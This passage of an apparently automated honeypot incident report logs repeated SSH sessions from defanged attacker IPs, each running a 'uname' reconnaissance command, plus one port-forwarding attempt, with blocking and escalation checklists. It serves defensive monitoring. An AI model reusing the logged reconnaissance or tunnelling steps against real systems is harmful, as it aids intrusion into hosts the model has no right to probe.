| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:09` | `cowrie.session.connect` |
| `2026-07-24 15:03:09` | `cowrie.client.version` |
| `2026-07-24 15:03:09` | `cowrie.client.kex` |
| `2026-07-24 15:03:10` | `cowrie.login.success` |
| `2026-07-24 15:03:10` | `cowrie.session.params` |
| `2026-07-24 15:03:10` | `cowrie.command.input` |
| `2026-07-24 15:03:11` | `cowrie.log.closed` |
| `2026-07-24 15:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0491140ebc7e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:16` | `cowrie.session.connect` |
| `2026-07-24 15:03:16` | `cowrie.client.version` |
| `2026-07-24 15:03:16` | `cowrie.client.kex` |
| `2026-07-24 15:03:16` | `cowrie.login.success` |
| `2026-07-24 15:03:17` | `cowrie.session.params` |
| `2026-07-24 15:03:17` | `cowrie.command.input` |
| `2026-07-24 15:03:17` | `cowrie.log.closed` |
| `2026-07-24 15:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcfc9161b0d2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:23` | `cowrie.session.connect` |
| `2026-07-24 15:03:23` | `cowrie.client.version` |
| `2026-07-24 15:03:23` | `cowrie.client.kex` |
| `2026-07-24 15:03:23` | `cowrie.login.success` |
| `2026-07-24 15:03:24` | `cowrie.session.params` |
| `2026-07-24 15:03:24` | `cowrie.command.input` |
| `2026-07-24 15:03:24` | `cowrie.log.closed` |
| `2026-07-24 15:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c6870a7084

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:30` | `cowrie.session.connect` |
| `2026-07-24 15:03:30` | `cowrie.client.version` |
| `2026-07-24 15:03:30` | `cowrie.client.kex` |
| `2026-07-24 15:03:30` | `cowrie.login.success` |
| `2026-07-24 15:03:31` | `cowrie.session.params` |
| `2026-07-24 15:03:31` | `cowrie.command.input` |
| `2026-07-24 15:03:31` | `cowrie.log.closed` |
| `2026-07-24 15:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6153397652fd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:37` | `cowrie.session.connect` |
| `2026-07-24 15:03:37` | `cowrie.client.version` |
| `2026-07-24 15:03:37` | `cowrie.client.kex` |
| `2026-07-24 15:03:38` | `cowrie.login.success` |
| `2026-07-24 15:03:38` | `cowrie.session.params` |
| `2026-07-24 15:03:38` | `cowrie.command.input` |
| `2026-07-24 15:03:38` | `cowrie.log.closed` |
| `2026-07-24 15:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-750efe188651

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:44` | `cowrie.session.connect` |
| `2026-07-24 15:03:44` | `cowrie.client.version` |
| `2026-07-24 15:03:44` | `cowrie.client.kex` |
| `2026-07-24 15:03:44` | `cowrie.login.success` |
| `2026-07-24 15:03:45` | `cowrie.session.params` |
| `2026-07-24 15:03:45` | `cowrie.command.input` |
| `2026-07-24 15:03:46` | `cowrie.log.closed` |
| `2026-07-24 15:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8234c3255038

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:51` | `cowrie.session.connect` |
| `2026-07-24 15:03:51` | `cowrie.client.version` |
| `2026-07-24 15:03:51` | `cowrie.client.kex` |
| `2026-07-24 15:03:52` | `cowrie.login.success` |
| `2026-07-24 15:03:52` | `cowrie.session.params` |
| `2026-07-24 15:03:52` | `cowrie.command.input` |
| `2026-07-24 15:03:52` | `cowrie.log.closed` |
| `2026-07-24 15:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f75aecc728a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:58` | `cowrie.session.connect` |
| `2026-07-24 15:03:58` | `cowrie.client.version` |
| `2026-07-24 15:03:58` | `cowrie.client.kex` |
| `2026-07-24 15:03:58` | `cowrie.login.success` |
| `2026-07-24 15:03:59` | `cowrie.session.params` |
| `2026-07-24 15:03:59` | `cowrie.command.input` |
| `2026-07-24 15:03:59` | `cowrie.log.closed` |
| `2026-07-24 15:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6eaaa2d829

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:05` | `cowrie.session.connect` |
| `2026-07-24 15:04:05` | `cowrie.client.version` |
| `2026-07-24 15:04:05` | `cowrie.client.kex` |
| `2026-07-24 15:04:06` | `cowrie.login.success` |
| `2026-07-24 15:04:06` | `cowrie.session.params` |
| `2026-07-24 15:04:06` | `cowrie.command.input` |
| `2026-07-24 15:04:07` | `cowrie.log.closed` |
| `2026-07-24 15:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc0c42cc1c1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:12` | `cowrie.session.connect` |
| `2026-07-24 15:04:12` | `cowrie.client.version` |
| `2026-07-24 15:04:12` | `cowrie.client.kex` |
| `2026-07-24 15:04:13` | `cowrie.login.success` |
| `2026-07-24 15:04:14` | `cowrie.session.params` |
| `2026-07-24 15:04:14` | `cowrie.command.input` |
| `2026-07-24 15:04:14` | `cowrie.log.closed` |
| `2026-07-24 15:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20593509b8d7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:20` | `cowrie.session.connect` |
| `2026-07-24 15:04:20` | `cowrie.client.version` |
| `2026-07-24 15:04:20` | `cowrie.client.kex` |
| `2026-07-24 15:04:20` | `cowrie.login.success` |
| `2026-07-24 15:04:21` | `cowrie.session.params` |
| `2026-07-24 15:04:21` | `cowrie.command.input` |
| `2026-07-24 15:04:21` | `cowrie.log.closed` |
| `2026-07-24 15:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2931d5908554

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:27` | `cowrie.session.connect` |
| `2026-07-24 15:04:27` | `cowrie.client.version` |
| `2026-07-24 15:04:27` | `cowrie.client.kex` |
| `2026-07-24 15:04:28` | `cowrie.login.success` |
| `2026-07-24 15:04:28` | `cowrie.session.params` |
| `2026-07-24 15:04:28` | `cowrie.command.input` |
| `2026-07-24 15:04:28` | `cowrie.log.closed` |
| `2026-07-24 15:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb18b9c617e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:34` | `cowrie.session.connect` |
| `2026-07-24 15:04:34` | `cowrie.client.version` |
| `2026-07-24 15:04:34` | `cowrie.client.kex` |
| `2026-07-24 15:04:34` | `cowrie.login.success` |
| `2026-07-24 15:04:35` | `cowrie.session.params` |
| `2026-07-24 15:04:35` | `cowrie.command.input` |
| `2026-07-24 15:04:35` | `cowrie.log.closed` |
| `2026-07-24 15:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-217f7cb22207

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:41` | `cowrie.session.connect` |
| `2026-07-24 15:04:41` | `cowrie.client.version` |
| `2026-07-24 15:04:41` | `cowrie.client.kex` |
| `2026-07-24 15:04:41` | `cowrie.login.success` |
| `2026-07-24 15:04:42` | `cowrie.session.params` |
| `2026-07-24 15:04:42` | `cowrie.command.input` |
| `2026-07-24 15:04:42` | `cowrie.log.closed` |
| `2026-07-24 15:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c75b8223bc7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:48` | `cowrie.session.connect` |
| `2026-07-24 15:04:48` | `cowrie.client.version` |
| `2026-07-24 15:04:48` | `cowrie.client.kex` |
| `2026-07-24 15:04:48` | `cowrie.login.success` |
| `2026-07-24 15:04:49` | `cowrie.session.params` |
| `2026-07-24 15:04:49` | `cowrie.command.input` |
| `2026-07-24 15:04:49` | `cowrie.log.closed` |
| `2026-07-24 15:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e5ec83ec087

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:04 |
| **Last Seen** | 2026-07-24 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:04:55` | `cowrie.session.connect` |
| `2026-07-24 15:04:55` | `cowrie.client.version` |
| `2026-07-24 15:04:55` | `cowrie.client.kex` |
| `2026-07-24 15:04:56` | `cowrie.login.success` |
| `2026-07-24 15:04:56` | `cowrie.session.params` |
| `2026-07-24 15:04:56` | `cowrie.command.input` |
| `2026-07-24 15:04:57` | `cowrie.log.closed` |
| `2026-07-24 15:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74e08b005332

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:02` | `cowrie.session.connect` |
| `2026-07-24 15:05:02` | `cowrie.client.version` |
| `2026-07-24 15:05:02` | `cowrie.client.kex` |
| `2026-07-24 15:05:02` | `cowrie.login.success` |
| `2026-07-24 15:05:03` | `cowrie.session.params` |
| `2026-07-24 15:05:03` | `cowrie.command.input` |
| `2026-07-24 15:05:03` | `cowrie.log.closed` |
| `2026-07-24 15:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04b779363b01

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:08` | `cowrie.session.connect` |
| `2026-07-24 15:05:08` | `cowrie.client.version` |
| `2026-07-24 15:05:09` | `cowrie.client.kex` |
| `2026-07-24 15:05:09` | `cowrie.login.success` |
| `2026-07-24 15:05:10` | `cowrie.session.params` |
| `2026-07-24 15:05:10` | `cowrie.command.input` |
| `2026-07-24 15:05:10` | `cowrie.log.closed` |
| `2026-07-24 15:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683e9abe77e7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:16` | `cowrie.session.connect` |
| `2026-07-24 15:05:16` | `cowrie.client.version` |
| `2026-07-24 15:05:16` | `cowrie.client.kex` |
| `2026-07-24 15:05:16` | `cowrie.login.success` |
| `2026-07-24 15:05:17` | `cowrie.session.params` |
| `2026-07-24 15:05:17` | `cowrie.command.input` |
| `2026-07-24 15:05:17` | `cowrie.log.closed` |
| `2026-07-24 15:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a592fce1728a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:23` | `cowrie.session.connect` |
| `2026-07-24 15:05:23` | `cowrie.client.version` |
| `2026-07-24 15:05:23` | `cowrie.client.kex` |
| `2026-07-24 15:05:23` | `cowrie.login.success` |
| `2026-07-24 15:05:24` | `cowrie.session.params` |
| `2026-07-24 15:05:24` | `cowrie.command.input` |
| `2026-07-24 15:05:24` | `cowrie.log.closed` |
| `2026-07-24 15:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74a3c317cf63

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:30` | `cowrie.session.connect` |
| `2026-07-24 15:05:30` | `cowrie.client.version` |
| `2026-07-24 15:05:31` | `cowrie.client.kex` |
| `2026-07-24 15:05:31` | `cowrie.login.success` |
| `2026-07-24 15:05:32` | `cowrie.session.params` |
| `2026-07-24 15:05:32` | `cowrie.command.input` |
| `2026-07-24 15:05:32` | `cowrie.log.closed` |
| `2026-07-24 15:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f8738dcfc53

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:38` | `cowrie.session.connect` |
| `2026-07-24 15:05:38` | `cowrie.client.version` |
| `2026-07-24 15:05:38` | `cowrie.client.kex` |
| `2026-07-24 15:05:38` | `cowrie.login.success` |
| `2026-07-24 15:05:39` | `cowrie.session.params` |
| `2026-07-24 15:05:39` | `cowrie.command.input` |
| `2026-07-24 15:05:39` | `cowrie.log.closed` |
| `2026-07-24 15:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aefce1aa61d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:39` | `cowrie.session.connect` |
| `2026-07-24 15:05:39` | `cowrie.client.version` |
| `2026-07-24 15:05:39` | `cowrie.client.kex` |
| `2026-07-24 15:05:40` | `cowrie.login.success` |
| `2026-07-24 15:05:40` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:05:40` | `cowrie.direct-tcpip.ja4` |
| `2026-07-24 15:05:40` | `cowrie.direct-tcpip.data` |
| `2026-07-24 15:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a4c01da9a5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:45` | `cowrie.session.connect` |
| `2026-07-24 15:05:45` | `cowrie.client.version` |
| `2026-07-24 15:05:45` | `cowrie.client.kex` |
| `2026-07-24 15:05:45` | `cowrie.login.success` |
| `2026-07-24 15:05:46` | `cowrie.session.params` |
| `2026-07-24 15:05:46` | `cowrie.command.input` |
| `2026-07-24 15:05:46` | `cowrie.log.closed` |
| `2026-07-24 15:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dad46501121

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:52` | `cowrie.session.connect` |
| `2026-07-24 15:05:52` | `cowrie.client.version` |
| `2026-07-24 15:05:52` | `cowrie.client.kex` |
| `2026-07-24 15:05:52` | `cowrie.login.success` |
| `2026-07-24 15:05:53` | `cowrie.session.params` |
| `2026-07-24 15:05:53` | `cowrie.command.input` |
| `2026-07-24 15:05:53` | `cowrie.log.closed` |
| `2026-07-24 15:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-288230686145

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:05 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:05:59` | `cowrie.session.connect` |
| `2026-07-24 15:05:59` | `cowrie.client.version` |
| `2026-07-24 15:05:59` | `cowrie.client.kex` |
| `2026-07-24 15:06:00` | `cowrie.login.success` |
| `2026-07-24 15:06:00` | `cowrie.session.params` |
